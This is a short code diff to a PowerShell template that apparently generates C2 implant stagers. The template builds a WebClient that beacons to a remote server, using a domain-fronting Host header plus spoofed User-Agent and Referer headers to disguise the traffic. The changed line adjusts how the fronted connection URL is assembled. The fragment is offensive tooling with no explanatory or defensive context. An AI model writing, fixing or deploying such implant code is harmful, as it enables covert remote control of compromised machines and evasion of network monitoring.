@@ -70,7 +70,7 @@ $wc = New-Object System.Net.WebClient;
 '+$proxynone+'
 $h="'+$domainfrontheader+'"
 if ($h -and (($psversiontable.CLRVersion.Major -gt 2))) {$wc.Headers.Add("Host",$h)}
-elseif($h){$script:s="https://$($h)/'+$connect+'"}
+elseif($h){$script:s="https://$($h)'+$connect+'";$script:sc="https://$($h)"}
 $wc.Headers.Add("User-Agent","'+$useragent+'")
 $wc.Headers.Add("Referer","'+$referer+'")
 if ($proxyurl) {
